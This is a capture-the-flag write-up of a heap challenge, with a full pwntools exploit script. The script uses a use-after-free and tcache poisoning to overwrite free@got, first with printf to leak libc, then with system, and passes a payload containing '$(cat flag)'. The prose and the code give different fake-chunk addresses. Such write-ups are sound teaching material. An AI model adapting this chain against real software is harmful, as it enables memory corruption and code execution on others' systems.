## Level: Medium

### Challenge

My first heap challenge, thank you @p0ch1ta for this super cool challenge. The intended way is **House of Muney** which is *leaklesss* heap exploit but I cheese'd it with getting a **leak** :)

More about House of Muney: https://maxwelldulin.com/BlogPost/House-of-Muney-Heap-Exploitation

### Checksec

![checksec](https://github.com/user-attachments/assets/c7e637d7-c3d5-4471-8c6a-f4e995039adf)

### How to leak? 

![menu](https://github.com/user-attachments/assets/2b949dc9-4cb1-4208-8fc7-b56701a8e267)

They give us an obvious vulnerability with `2. Change chunk size` but I didn't use it :P There is already **UAF** in this binary and I think that's all you need to get a shell. 

Anyway, we can change the `got` address of **free** with *printf* so it would call printf whenever we free a chunk. In order to do that we need to **fake** a chunk to read into that address near `got entries` and change it. 

Here's my approach (The order matters!!):

```
1 - Malloc chunk 0 and chunk 1
2 - Free 1 then and 0
```

![free2](https://github.com/user-attachments/assets/baacd9f6-ec15-419b-a1d4-6fb438b15b0b)

Mind that `chunk 0` is behind `chunk 1`. 

```
3 - Edit free'd chunk 0 to fake a chunk (UAF)
```
![uaf1](https://github.com/user-attachments/assets/9078a95b-29db-4884-9abd-1af8c2f3f638)

Now `chunk 0` is pointing to `AAAAAAAA` instead of pointing to the `next chunk` (chunk 1). Of course we don't want chunk 0 to point some random address. We can make it point to a **mallocable** address. 

![gotoffree](https://github.com/user-attachments/assets/406238ec-be12-4aa0-a2b1-75f209ac626e)

There are some caveats to fake a chunk and turns out `0x453508` is perfect. It's near got entries and most importantly mallocable. Make sure that `chunk 0 and 1` have *enough size* to read into **free@got**. Which is at least `40 bytes` in this case. 

```
4 - Malloc twice so fake chunk gets allocated and points to free@got
```

![empty](https://github.com/user-attachments/assets/6ef3a766-c2a5-41ad-b77d-f7ba363b9acb)

Tcache is empty, this means that our `fake chunk` is allocated. 

```
5 - Use "4. Edit chunk" option to start reading into fake chunk's next pointer. Which is somewhere near got entries. 
```

![readgots](https://github.com/user-attachments/assets/2c7867b9-1328-412e-94ab-78acb88873b8)

This looks good! But how are we going to get a leak? 

```
6 - Overwrite free@got with printf and use format strings to leak from the stack
7 - Free the fake chunk to call printf (specify format strings to leak info about addresses on the stack)
```

![leaksss](https://github.com/user-attachments/assets/89d35390-01fa-4434-b9d1-de18196c3bfd)


Now that we have our leak in libc, we can calculate the offset to `libc base` and we are almost done. 

```
8 - Overwrite free@got again but with system!
9 - Free the fake chunk to call system("/bin/sh")
```

![flaggg](https://github.com/user-attachments/assets/9999e3cf-a772-47a6-a610-841707b260e3)

Getting a shell was quite painful so I just write out the flag. This was really fun even tho it wasn't intented solution! I think I learned a lot from this and I must include following writeups that inspired me for this solution:
https://www.youtube.com/watch?v=qVLXHNqxpkE (by c0nrad)
https://github.com/MarcoPellero/writeups/blob/main/backdoor/konsolidator/writeup.md

### Full Exploit

```
#!/usr/bin/env python3

from pwn import *
"""
p = gdb.debug("./chall_patched", gdbscript='''
    continue 
''')
"""

p = process("./chall_patched")

# allocate two chunks
p.recvuntil(b">> ")
p.sendline("1")
p.recvuntil(b">> ")
p.sendline("0")
p.recvuntil(b">> ")
p.sendline(b"40")

p.recvuntil(b">> ")
p.sendline("1")
p.recvuntil(b">> ")
p.sendline("1")
p.recvuntil(b">> ")
p.sendline(b"40")

# free them 
p.recvuntil(b">> ")
p.sendline("3")
p.recvuntil(b">> ")
p.sendline("1")

p.recvuntil(b">> ")
p.sendline("3")
p.recvuntil(b">> ")
p.sendline("0")

# USE AFTER FREE
# change chunk's pointer to somewhere (mallocable) near got entries
near_got = 0x403508 
p.recvuntil(b">> ")
p.sendline("4")
p.recvuntil(b">> ")
p.sendline("0")
p.recvuntil(b">> ")
p.sendline(p64(near_got))

# malloc twice
p.recvuntil(b">> ")
p.sendline("1")
p.recvuntil(b">> ")
p.sendline("1")
p.recvuntil(b">> ")
p.sendline(b"40")

p.recvuntil(b">> ")
p.sendline("1")
p.recvuntil(b">> ")
p.sendline("1")
p.recvuntil(b">> ")
p.sendline(b"40")

# overwrite the got entry of "free" with "printf"
# leak an address in libc with format strings
payload = b"%17$pAAA" # this is rdi
payload += b"A" * 24
payload += p64(0x401120)
p.recvuntil(b">> ")
p.sendline("4")
p.recvuntil(b">> ")
p.sendline("1")
p.recvuntil(b">> ")
p.sendline(payload)

# leak(free) and calculate the offset to "system"
p.recvuntil(b">> ")
p.sendline("3")
p.recvuntil(b">> ")
p.sendline("1")

p.recvuntil(b"Data")
p.recvline()
p.recvline()
p.recvline()
p.recvline()
p.recvline()
p.recvline()
p.recvline()

libc_leak = p.recvline()
print(libc_leak)
libc_leak = int(libc_leak[3:17], 16)

libc_base = libc_leak - 544229
print("LIBC_BASE: " + hex(libc_base))

system = libc_base + 336528
print("SYSTEM: " + hex(system))

# overwrite the got entry of "free" with "system"
# write out the flag
payload = b"//bin/sh" # rdi
payload += b" $(cat flag)"
payload += b" " * 12
payload += p64(system)
p.recvuntil(b">> ")
p.sendline("4")
p.recvuntil(b">> ")
p.sendline("1")
p.recvuntil(b">> ")
p.sendline(payload)

# call system("/bin/sh...")
p.recvuntil(b">> ")
p.sendline("3")
p.recvuntil(b">> ")
p.sendline("1")

p.interactive()
```

<img src=https://media1.giphy.com/media/v1.Y2lkPTc5MGI3NjExemJpd2ZkZ2o5Nnk0cTJsM3F6cnkwY3VlZG51bnloczVyMGhsa29ibiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/kbuqdYYYjuHn2/giphy.webp>

                Heap is fun :P
